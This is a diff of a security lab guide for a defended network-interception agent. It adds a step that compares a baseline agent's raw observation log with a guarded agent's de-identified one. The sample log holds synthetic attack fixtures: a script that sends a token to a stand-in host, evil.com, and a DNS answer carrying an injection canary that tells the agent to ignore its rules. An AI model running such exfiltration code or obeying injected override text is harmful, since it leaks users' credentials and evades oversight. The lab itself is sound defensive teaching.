@@ -118,7 +118,7 @@ cd ..
 status                       taint=high   prov=intercepted_network  val=200
 headers.Content-Type         taint=high   prov=intercepted_network  val=application/json
 headers.Server               taint=high   prov=intercepted_network  val=nginx/1.18
-body                         taint=high   prov=intercepted_network  val={"user": "alice", "role": "admin", "toke
+body                         taint=high   prov=intercepted_network  val={"user": "alice", "contact": "alice@corp
 ```
 
 Two properties to record:
@@ -299,9 +299,50 @@ cd ..
 
 ---
 
+### Step 7: Inspect the observation log
+
+```bash
+cd demo-09-interceptbound && python3 student/interceptbound.py 2>&1 | sed -n '/Observation log/,/^$/p' && cd ..
+```
+
+**What this does**: Prints the observation log each agent keeps — the one thing a defended interception agent is *allowed* to retain, a compact note per in-scope frame — so you can read the baseline's raw notes against the guarded agent's de-identified ones.
+
+**Why it matters** — expected (verbatim):
+
+```
+--- Observation log: what each agent writes down ---
+  Baseline (recorded in the clear):
+    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
+    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
+    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls 192.168.1.20:443 CN=api.internal.example
+    custom 192.168.1.30:9999 DATA_CHUNK_1
+    http 192.168.1.10:80 {"error": "unauthorized"}
+    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
+    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
+  Guarded (de-identified before recording):
+    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
+    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
+    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls HOST_ec1a:443 CN=api.internal.example
+    custom HOST_ff75:9999 DATA_CHUNK_1
+    http HOST_0272:80 {"error": "unauthorized"}
+    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
+  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
+  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)
+```
+
+`record_observation` was the action allowed for every in-scope frame in Step 4; this is what those observations actually contain. Between scope and taint (`scope → observe/de-identify → taint → guard`), each note is passed through `shared/anonymize.py` (`Anonymizer.deidentify`) before it is recorded. The baseline keeps the same notes in the clear — its log still holds `alice`, `alice@corp.example`, and `DEMO_TOKEN_ABC123`. Three properties to record:
+
+1. **Pseudonymize what still has to be analyzed**: source IPs and usernames become stable tags (`HOST_0272`, `USER_5aff`) and the synthetic `contact` e-mail becomes `EMAIL_e50e`. Stable means `192.168.1.10` is `HOST_0272` in frames 001, 002 and 006, so an analyst can still ask "which frames mention HOST_0272?" without learning the host — and can recover it locally with `agent.anon.reverse("HOST_0272")`, because the map lives on the machine that made it, never in the record.
+2. **Redact what has no analytic use**: a token or password is destroyed (`[REDACTED]`), not tagged — there is nothing to preserve. The pass redacts secrets first, then pseudonymizes the identifiers that remain, so a secret that happens to look like an identifier is still destroyed.
+3. **Scope bounds what is even observed**: frame_007 is out of scope (Step 6), so the guarded agent never records it — the guarded log has seven lines to the baseline's eight, and only the baseline holds frame_007's user and forged token. The summary line proves the property: `0 identities or secrets written in the clear`.
+
+---
+
 ## 🧹 Part 4: The Ephemeral Buffer
 
-### Step 7: Exercise TTL and secure deletion
+### Step 8: Exercise TTL and secure deletion
 
 ```bash
 cd demo-09-interceptbound && python3 - << 'EOF'
@@ -344,13 +385,13 @@ Why does a *defended* pipeline hold intercepted credentials at all? Because pars
 
 ---
 
-### Step 8: Run the test suite
+### Step 9: Run the test suite
 
 ```bash
 cd demo-09-interceptbound && python3 -m pytest tests/ -v && cd ..
 ```
 
-**What this does**: Runs all 39 tests (`39 passed`). Key pins:
+**What this does**: Runs all 44 tests (`44 passed`). Key pins:
 
 | Test | Pins |
 |------|------|
@@ -420,8 +461,9 @@ When a credential-like value is parsed (`credential_flags` non-empty — the `Co
 - [ ] Defended agent's three distinct block reasons recorded, plus what was allowed (observations from frames 001–006; frame_008's store_token)
 - [ ] Guard boundary swept at the fixture's ceilings and with the default raised to MEDIUM; rule-2 case identified
 - [ ] Scope-vs-taint separation demonstrated with synthetic frames (source and destination)
+- [ ] Observation log inspected; de-identification (stable pseudonyms, redacted secrets) and the frame_007 scope consequence noted
 - [ ] Buffer TTL, eviction, and zeroing exercised; residual-risk note written
-- [ ] All 39 tests pass; the parse-never-called scope test noted
+- [ ] All 44 tests pass; the parse-never-called scope test noted
 - [ ] At least Beginner + Exercise 9.2 (refinement) — 9.2 is essential
 - [ ] `LAB_NOTES.md` Module 9 block filled (seed 42, commit, `make demo DEMO=09`)
 
